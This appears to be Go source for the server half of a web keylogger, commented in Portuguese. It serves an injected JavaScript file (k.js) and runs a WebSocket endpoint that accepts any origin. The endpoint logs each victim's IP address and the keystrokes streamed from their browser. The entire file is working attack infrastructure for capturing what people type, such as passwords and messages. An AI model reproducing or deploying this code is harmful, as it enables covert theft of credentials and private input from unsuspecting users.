package main

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	//todo: limitar a origem a um valor explícito
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	listenAddr string
	wsAddr     string
	jsTemplate *template.Template
)

//executada automaticamente antes da main
func init() {

	//argumentos de linha de comando
	flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
	flag.Parse()

	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}

func serveWS(w http.ResponseWriter, r *http.Request) {
	//qualquer solicitação HTTP tratada por esse func será atualizada p usar o protocolo WebSockets
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
		return
	}
	defer conn.Close()

	fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
	//loop infinito para ler as mensagens recebidas que, se o js funcionar, serão as teclas pressionadas
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}
		//print endereço IP remoto do cliente e as teclas que foram pressionadas
		fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
	}
}

//preenche o modelo com os dados e grava como uma resposta HTTP
func serveFile(w http.ResponseWriter, r *http.Request) {
	//diz aos navegadores do conectados que o conteúdo do corpo da resposta HTTP deve ser tratado com JS
	w.Header().Set("Content-Type", "application/javascript")
	//ws: endereço do meu servidor socket criado
	jsTemplate.Execute(w, wsAddr)
}

func main() {

	r := mux.NewRouter()
	r.HandleFunc("/ws", serveWS)
	r.HandleFunc("/k.js", serveFile)
	log.Fatal(http.ListenAndServe(":8080", r))
}
